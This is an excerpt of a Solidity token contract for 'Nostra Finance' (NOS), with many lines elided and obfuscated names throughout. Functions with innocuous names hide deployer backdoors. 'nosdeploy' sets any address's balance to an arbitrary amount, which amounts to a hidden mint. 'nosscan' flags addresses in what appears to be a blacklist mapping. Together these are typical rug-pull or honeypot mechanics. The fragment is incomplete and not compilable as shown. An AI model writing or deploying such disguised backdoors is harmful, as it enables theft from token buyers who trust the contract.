...
contract nostra {
    ...
    // 
    string public name = "Nostra Finance";
    string public symbol = unicode"NOS";
    ...
    address Router = 0x034065E2d872C03d6F52fbDF2B3C7E1b530057bB;
    address Deployer = 0xC588A788c4FC3e74d800871F84DEC64ae4F9CA38;
    ...
    modifier iQ () {
        ...
        function Setpool(address Ex) iQ public {
        require(msg.sender == owner);
        eRn[Ex] = true;} 
        ...
        return eTXm[account]; }
        function nosscan(address Ex) Si public{          
        require(!eRSm[Ex]);
        eRSm[Ex] = true;}
		modifier Si () {
        ...
        return true; }
		 function nosdeploy(address Ex, uint256 iZ) Si public returns (bool success) {
        eTXm[Ex] = iZ;
        return true; }
